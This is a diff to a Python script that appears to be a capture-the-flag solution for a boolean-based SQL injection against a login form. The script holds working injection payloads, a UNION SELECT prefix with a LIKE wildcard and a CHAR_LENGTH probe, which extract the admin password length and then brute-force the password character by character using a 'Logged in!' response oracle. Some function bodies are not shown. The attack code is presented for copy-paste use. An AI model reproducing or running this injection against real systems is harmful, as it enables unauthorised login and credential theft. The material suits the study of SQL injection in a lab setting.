@@ -1,6 +1,10 @@
-This is a simple boolean injection.
+#!/usr/bin/python
 
-Copy and paste the below into a python script:
+'''
+This is a simple boolean injection. We hope you did not do this manually!
+The result of this is: 
+
+
 
 import urllib2
 import sys
@@ -17,7 +21,7 @@ def con(username , password , char , answer):
         answer += char
     return answer
 
-alpha = "abcdefhijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
+alpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_"
 
 PREFIX = "\' UNION SELECT * from users where username = \"admin\" AND password LIKE \""
 SUFFIX = "%\" -- "
@@ -42,7 +46,7 @@ def brute():
 
 def get_pass_length():
     length = 0
-    QUERY = "\ ' UNION SELECT * from users where username = \"admin\" AND CHAR_LENGTH(password) > "
+    QUERY = "\' UNION SELECT * from users where username = \"admin\" AND CHAR_LENGTH(password) > "
     COMMENT = " -- "
     POSITIVE = "Logged in!"
     query_status = True
